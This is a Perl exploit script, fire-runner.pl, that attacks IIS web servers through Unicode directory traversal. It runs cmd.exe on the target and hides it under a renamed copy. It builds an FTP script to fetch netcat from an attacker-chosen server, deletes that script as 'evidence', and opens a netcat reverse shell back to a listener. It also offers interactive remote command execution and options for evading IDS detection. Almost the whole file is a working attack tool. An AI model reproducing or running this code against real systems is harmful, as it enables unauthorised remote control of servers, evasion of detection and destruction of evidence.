#!/usr/bin/perl -w
##################

##
# tool:         fire-runner.pl
# version:      0.9 based off unicoder.pl 1.9
# author:       Kevin Timm <ktimm@stingrey.com>
# purpose:      Uses Unicode directory traversal to create back channels through firewalls.
#               Will defeate most default firewall configurations and if used over ssl will
#               defeat IDS's as well
# props         Heavily based in H D Moore <hdmoore@digitaldefense.net> unicoder.pl used as basis of exploits
#               Excellent code why not use it.
# usage:        Run with no arguments for usage options
# output:       Output from remote command
# Other:        I'm a lousy coder so a lot of other people would be able to do better.

use Getopt::Std;
use Socket;

# determine whether or not to enable SSL support
BEGIN {

    if (eval "require Net::SSLeay") {
        Net::SSLeay->import();
                Net::SSLeay::load_error_strings();
                Net::SSLeay::SSLeay_add_ssl_algorithms();
                Net::SSLeay::randomize(time());
                $HAVE_SSL = 1;
    } else {
        $HAVE_SSL = 0;
    }
}


sub usage {
    print STDERR qq{

*- --[ fire-runner.pl 0.9 <Kevin Timm ktimm\@stingrey.com> based on unicoder.pl 1.9  - H.D. Moore <hdmoore\@digitaldefense.net>

Usage: $0 -h <host> -U <ftp-user> -F <ftp-server> -B <back-channel-ip>

        -h <host>       = host you want to attack
        -d <directory>  = directory to use 
        -u <unicode>    = unicode sequence to use
        -c <command>    = command to execute
        -f <cmd file>   = file containing commands
        -p <port>       = web server port

Fire-Runner Options:
        -U <ftp-user>    = user account on ftp server where file will be transferred from
        -D <ftp-password>= password for ftp account
        -N <netcat name> = File name for netcat, may want to call it something else to avoid IDS 
        -F <ftp-server>  = Ftp server to get files from
        -B <back-ip>     = IP of host that is running a Netcat listener, does not need to be same as attacking host
        -C <cmd.exe>     = What to rename cmd.exe to. May help avoid being noticed by IDS to much default is index.exe
 
Proxy Options:

        -w <http proxy> = use http proxy
        -a <akamai box> = use akamai proxy 
           format: <hostname>:<cache dir>)
        -P <proxy port> = sets proxy port

Other Options:

        -x              = ssl mode
        -i              = interactive mode
        -v              = verbose

};
    exit(1);
}

sub send_request {

    my ($request) = @_;
    my $results = "";
    my $got;
    my $ssl;
    my $ctx;
    my $res;
           
    select(STDOUT); $| = 1;
    socket(S,PF_INET,SOCK_STREAM, getprotobyname('tcp') || 0) || die("Socket problems\n");
    select(S); $|=1;
    select(STDOUT);

    if(connect(S,pack "SnA4x8",2,$options{"HostPort"},$options{"ip"}))
    {
        if ($args{x})
        {
            $ctx = Net::SSLeay::CTX_new() or die_now("Failed to create SSL_CTX $!");
            $ssl = Net::SSLeay::new($ctx) or die_now("Failed to create SSL $!");
            Net::SSLeay::set_fd($ssl, fileno(S));   # Must use fileno
            $res = Net::SSLeay::connect($ssl);
            $res = Net::SSLeay::write($ssl, $request);  # Perl knows how long $msg is
            shutdown S, 1;    

            while ($got = Net::SSLeay::read($ssl))
            {
                $results .= $got;
            }         

            Net::SSLeay::free ($ssl);               # Tear down connection
            Net::SSLeay::CTX_free ($ctx);
            close(S); 
        } else {
            print S $request;
            sleep(1);
            shutdown S, 1; 
            while ($got = <S>)
            {
                $results .= $got;
            } 
            close(S);
        }
         } else { die("Error: connection failed.\n"); }
    return $results;
}

###################################################
#
# MAIN STARTS HERE
#

@csets = qw (%255c %%35c %%35%63 %25%35%63 %c0%af %c1%1c %c0%9v %c0%qf %c1%8s %c1%9c %c1%pc %c1%1c %c0%2f);
@cdirs = qw (/scripts/ /msadc/ /iisadmpwd/ /_vti_bin/ /exchange/ /cgi-bin/ /pbserver/ /);
@cmds = ();

%options =  (
                "TargetPort" => 80,
                "HostPort" => 1285,
                "RequestPrefix" => "",          # for akamai and http proxying
                "runcmd" => 0,
                "shell" => "cmd.exe"
            );


my ($cdir, $cset, $url, $data, $req, $res, $ua);
my $vdir = 0;
my $vset = 0;
my $binip;



getopts("h:d:u:c:p:w:f:a:U:D:N:F:B:P:C:W:xvi", \%args);

############################
### start option parsing ###
############################

if (!$args{h}){usage();}

$binip = gethostbyname($args{h});

if (length($binip) == 0)
{
    print STDERR "The host you specified is invalid.\n";
    exit(257);
} else {
        $options{"ip"} = $binip;
        $options{"Target"} = $args{h};
}

if($args{x} && $HAVE_SSL == 0){ print "Please install the Net::SSLeay module for SSL support.\n"; exit; }
if ($args{x}){ $options{"HostPort"} = 443;}

if ($args{x} && $args{a} || $args{w} && $args{x})
{
        print STDERR "Sorry, that proxy mode does not work with SSL.\n";
        exit(256);
}

if ($args{w} && $args{a})
{
        print STDERR "Sorry, those proxy modes can not be combined.\n";
        exit(256);
}

if ($args{p})
{
        $options{"TargetPort"} = $args{p};
}

if ($args{P})
{
        $options{"HostPort"} = $args{P};
} else {
        $options{"HostPort"} = $options{"TargetPort"};
}

if ($args{w})
{
        $options{"RequestPrefix"} = "http://" . $options{"Target"} . ":" . $options{"TargetPort"};
        $options{"Host"} = $args{w};
        $binip = gethostbyname($options{"Host"});
        if (length($binip) <= 0)
        {
                print STDERR "Sorry, could not resolve the http proxy host.\n";
                exit(256);
        }
        $options{"ip"} = $binip;
}

if ($args{a})
{
        ($options{"Host"}, $options{"AkamaiCache"}) = split(/\:/, $args{a});
        $binip = gethostbyname($options{"Host"});
        if (length($binip) <= 0)
        {
                print STDERR "Sorry, could not resolve the Akamai proxy host.\n";
                exit(256);
        }
        $options{"ip"} = $binip;
        $options{"RequestPrefix"} = $options{"AkamaiCache"} . "/" . $options{"Target"} . ":" . $options{"TargetPort"};
}

if ($args{d})
{
    $options{"dir"} = $args{d};
    @cdirs = ();
    push @cdirs,$args{d};
}
if ($args{u})
{
    $options{"unicode"} = $args{u};
    @csets = ();
    push @csets,$args{u};
}
if ($args{c})
{
        push @cmds, $args{c};
        $options{"runcmd"}++;
} else {

        if ($args{f})
        {

                open (CF, "<" . $args{f}) || die "could not open command file:  $!";
                while ($cmd = <CF>)
                {
                        chomp($cmd);
                        push @cmds, $cmd;
                        $options{"runcmd"}++;
                }
                close (CF);
        }
}

if ($args{W})
{
        $options{"shell"} = $args{W};
}

if ($args{v})
{
        print STDERR "[Options Table]\n";
        foreach $key (keys(%options))
        {
                print STDERR "$key = " . $options{"$key"} . "\n";
        }
        print STDERR "---------------\n\n";

}

##############################
##### Fire-Runner Options#####
##############################

$user = "$args{U}";
$ftphost = "$args{F}";
$back_host = "$args{B}";

if ($args{D}) {
        $password = "$args{D}";
        } else {
                $password = "";
        }


if ($args{C}) {
        $com = "$args{C}";
        } else {
                $com = "index.exe";
        }

if ($args{N}) {
        $netcat = "$args{N}";
        } else {
                $netcat = "nc.exe";
        }

if (!$args{U}){usage();}
if (!$args{F}){usage();}
if (!$args{B}){usage();}


#############################
######### End ###############
#############################

# start the scanning loop
foreach $cdir (@cdirs)
{
    foreach $cset (@csets)
    {

                if (($options{"runcmd"} > 0 || $args{i}) && $vdir && $vset ) { last; }

        $results = $got = $header = $junk = "";
                $results = "";
        $url =  "$cdir..$cset../..$cset../..$cset../..$cset../winnt/system32/".$options{"shell"}."?/c+dir";
        
                $request =
        "GET " . $options{"RequestPrefix"} . "$url HTTP/1.1\r\n" . 
        "Host: " . $args{h} . "\r\n".
        "Accept: */*\r\n".
        "\r\n";
        

        select(STDOUT); $| = 1;
        print "Checking directory $cdir with sequence $cset: ";
        select(STDOUT);
        $results = send_request($request);
        ($header,$junk) = split(/\n/,$results);
        if ($results =~ /<DIR>/)
        {
            print "FOUND -- Lets Attack\n";
                $vdir = $cdir;
            $vset = $cset;

################################
##### Fire-Runner Exploit ######
################################


        $url1 =  "$cdir..$cset../..$cset../winnt/system32/".$options{"shell"}."?/c+copy+\\winnt\\system32\\cmd.exe+$com";
        $url2 =  "$cdir/$com?/c+echo+user+$user+>ftpfile";
        $url3 =  "$cdir/$com?/c+echo+$password+>>ftpfile";
        $url4 =  "$cdir/$com?/c+echo+binary+>>ftpfile";
        $url5 =  "$cdir/$com?/c+echo+get+$netcat+>>ftpfile";
        $url6 =  "$cdir/$com?/c+echo+quit+>>ftpfile";
        $url7 =  "$cdir/$com?/c+ftp+-s:ftpfile+-n+$ftphost";
        $url8 =  "$cdir/$com?/c+del+ftpfile";
        $url9 =  "$cdir/$com?/c+$netcat+-e+index.exe+$back_host+80";

                $request1 =
        "GET " . $options{"RequestPrefix"} . "$url1 HTTP/1.1\r\n" . 
        "Host: " . $args{h} . "\r\n".
        "Accept: */*\r\n".
        "\r\n";

                $request2 =
        "GET " . $options{"RequestPrefix"} . "$url2 HTTP/1.1\r\n" . 
        "Host: " . $args{h} . "\r\n".
        "Accept: */*\r\n".
        "\r\n";
                $request3 =
        "GET " . $options{"RequestPrefix"} . "$url3 HTTP/1.1\r\n" . 
        "Host: " . $args{h} . "\r\n".
        "Accept: */*\r\n".
        "\r\n";
                $request4 =
        "GET " . $options{"RequestPrefix"} . "$url4 HTTP/1.1\r\n" . 
        "Host: " . $args{h} . "\r\n".
        "Accept: */*\r\n".
        "\r\n";
                $request5 =
        "GET " . $options{"RequestPrefix"} . "$url5 HTTP/1.1\r\n" . 
        "Host: " . $args{h} . "\r\n".
        "Accept: */*\r\n".
        "\r\n";

                $request6 =
        "GET " . $options{"RequestPrefix"} . "$url6 HTTP/1.1\r\n" . 
        "Host: " . $args{h} . "\r\n".
        "Accept: */*\r\n".
        "\r\n";
                $request7 =
        "GET " . $options{"RequestPrefix"} . "$url7 HTTP/1.1\r\n" . 
        "Host: " . $args{h} . "\r\n".
        "Accept: */*\r\n".
        "\r\n";
                $request8 =
        "GET " . $options{"RequestPrefix"} . "$url8 HTTP/1.1\r\n" . 
        "Host: " . $args{h} . "\r\n".
        "Accept: */*\r\n".
        "\r\n";

                $request9 =
        "GET " . $options{"RequestPrefix"} . "$url9 HTTP/1.1\r\n" . 
        "Host: " . $args{h} . "\r\n".
        "Accept: */*\r\n".
        "\r\n";

        $results = $got = $header = $junk = "";
                $results = "";

        $results = send_request($request1);
        print "Copying cmd.exe to $com\n";
        ($header,$junk) = split(/\n/,$results);
        print "$header\n";

        $results = send_request($request2);
        print "Creating FTP File\n";
        ($header,$junk) = split(/\n/,$results);
        print "$header\n";

        $results = send_request($request3);
        print "Creating FTP File\n";
        ($header,$junk) = split(/\n/,$results);
        print "$header\n";

        $results = send_request($request4);
        print "Creating FTP File\n";
        ($header,$junk) = split(/\n/,$results);
        print "$header\n";

        $results = send_request($request5);
        print "Creating FTP File\n";
        ($header,$junk) = split(/\n/,$results);
        print "$header\n";

        $results = send_request($request6);
        print "Creating FTP File\n";
        ($header,$junk) = split(/\n/,$results);
        print "$header\n";

        $results = send_request($request7);
        print "Ftping Netcat\n";
        ($header,$junk) = split(/\n/,$results);
        sleep 7;
        print "$header\n";

        $results = send_request($request8);
        print "Removing ftp evidence\n";
        ($header,$junk) = split(/\n/,$results);
        print "$header\n";

        print "Connecting back to you\n";
        $results = send_request($request9);
        ($header,$junk) = split(/\n/,$results);
        print "$header\n";

## If the explot worked which it  should have it got to hear why go any further 

exit ;

#################################
#### End Fire-Runner Exploit ####
#################################

        } else {
            print "ERROR: $header\n";
        }
    }
        if ($options{"runcmd"} > 0) {  }
}

$skipcheck = 0;

# execute a command if one was given
if ((scalar(@cmds) > 0 || $args{i}) && $vdir ne "" && $vset ne "")
{
        COMMANDLOOP:

        while($command = shift(@cmds))
        {


                # hex encode a few chars

                $command =~ s/ /+/g;
                $command =~ s/=/\%3D/g;
                $command =~ s/\|/\%7C/g;

                $command =~ s/\=/%3d/g;
                $command =~ s/\&/%26/g;
                $command =~ s/\"/%22/g;


        $results = $got = $header = $junk = "";
        $urlT = "$vdir..$vset../..$vset../..$vset../..$vset../winnt/system32/".$options{"shell"}."?/c+dir+..\\..\\..\\..\\..\\..\\uni.exe";
        $urlS = "$vdir..$vset../..$vset../..$vset../..$vset../winnt/system32/".$options{"shell"}."?/c+copy+..\\..\\..\\..\\..\\..\\winnt\\system32\\cmd.exe+..\\..\\..\\..\\..\\..\\uni.exe";
        $urlCA = "$vdir..$vset../..$vset../..$vset../..$vset../uni.exe?/c+$command";
        $urlCB = "$vdir..$vset../..$vset../..$vset../..$vset../winnt/system32/".$options{"shell"}."?/c+$command";

        $requestT =
        "GET " . $options{"RequestPrefix"} . "$urlT HTTP/1.1\r\n" . 
        "Host: " . $args{h} . "\r\n".
        "Accept: */*\r\n".
        "\r\n";

         $requestS =
        "GET " . $options{"RequestPrefix"} . "$urlS HTTP/1.1\r\n" . 
        "Host: " . $args{h} . "\r\n".
        "Accept: */*\r\n".
        "\r\n";

        $requestCA =
        "GET " . $options{"RequestPrefix"} . "$urlCA HTTP/1.1\r\n" . 
        "Host: " . $args{h} . "\r\n".
        "Accept: */*\r\n".
        "\r\n";

        $requestCB =
        "GET " . $options{"RequestPrefix"} . "$urlCB HTTP/1.1\r\n" . 
        "Host: " . $args{h} . "\r\n".
        "Accept: */*\r\n".
        "\r\n";    


        # see if our copy of cmd.exe is in the root dir yet
                if ($skipcheck == 0)
                {
                $results = send_request($requestT);
                        if ($results =~ m/uni.exe/)
                {
                        print "using \\uni.exe as command interpreter.\n";
                } else {
                        $results = send_request($requestS);
                        if ($results !~ "copied")
                        {
                        print STDERR "error: could not copy ".$options{"shell"}." to \\uni.exe.\n";
                        print STDERR "running command with the default intepreter.\n";
                        $requestCA = $requestCB;
                        } else {
                        print "copied ".$options{"shell"}." to \\uni.exe\n";
                        print "using \\uni.exe as command interpreter.\n";
                        }
                }
                }

        $results = send_request($requestCA);

        print "\n*--- --  -[ command results ]\n\n";
        print $results;
        print "\n\n";
        }

        if($args{i})
        {
                if ($skipcheck == 0)
                {
                        select(STDERR);$|=1;
                        print STDERR "\nEnter an empty command to quit\n\n";
                }

                $skipcheck++;
                print STDERR "unicoder > ";
                $cmd = <STDIN>;
                chomp($cmd);
                if ($cmd ne "")
                { 
                        push @cmds, $cmd;
                        $options{"runcmd"}++;
                        goto COMMANDLOOP;
                }
        }
}

